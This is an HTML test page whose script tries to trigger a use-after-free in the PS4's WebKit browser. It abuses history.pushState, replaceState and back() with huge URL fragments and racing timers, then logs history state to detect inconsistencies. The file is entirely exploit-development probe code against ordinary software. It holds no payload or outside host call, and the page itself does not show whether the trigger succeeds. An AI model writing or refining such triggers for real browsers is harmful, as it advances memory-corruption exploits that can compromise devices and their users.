<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – FINAL CONTROL TEST</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { padding:10px; font-size:16px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>

<body>
<h2>FINAL TEST – CONTROL / DECISION</h2>
<button onclick="run()">RUN FINAL TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function uafTrigger(){
    let size = 977;
    const STEP = 14461;

    log("=== UAF TRIGGER START ===");
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({i}, "", "#"+frag);
        history.replaceState({i}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(), 0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
}

async function run(){
    logEl.textContent = "";

    await uafTrigger();
    await sleep(80);

    // -----------------------------
    // BASELINE SNAPSHOT
    // -----------------------------
    const baseURL = location.href;
    const baseLen = baseURL.length;
    const baseState = history.state;

    log("\n=== BASELINE ===");
    log("URL.length = " + baseLen);
    log("history.state = " + JSON.stringify(baseState));

    // -----------------------------
    // CONTROL COLLISION
    // -----------------------------
    log("\n=== CONTROL COLLISION ===");

    // Decision A: small fragment + state A
    setTimeout(()=>{
        location.hash = "#S";
        history.replaceState({ctrl:"A"}, "", location.href);
        log("[A] small fragment + state A");
    }, 0);

    // Decision B: large fragment + state B
    setTimeout(()=>{
        let big = "B".repeat(680644);
        history.replaceState({ctrl:"B"}, "", "#"+big);
        log("[B] large fragment + state B");
    }, 0);

    // Decision C: back navigation
    setTimeout(()=>{
        history.back();
        log("[C] history.back()");
    }, 0);

    await sleep(200);

    // -----------------------------
    // POST SNAPSHOT
    // -----------------------------
    log("\n=== POST ===");
    log("URL.length = " + location.href.length);
    log("URL hash length = " + location.hash.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    // -----------------------------
    // LOGICAL CONSISTENCY CHECK
    // -----------------------------
    log("\n=== CONSISTENCY CHECK ===");

    if(history.state && history.state.ctrl){
        log("Final ctrl = " + history.state.ctrl);
    } else {
        log("Final ctrl = <none>");
    }

    if(location.hash.length < 10 && history.state?.ctrl === "B"){
        log("!!! INCONSISTENCY: small hash + state B");
    }

    if(location.hash.length > 1000 && history.state?.ctrl === "A"){
        log("!!! INCONSISTENCY: large hash + state A");
    }

    log("\n=== TEST END ===");
}

</script>
</body>
</html>
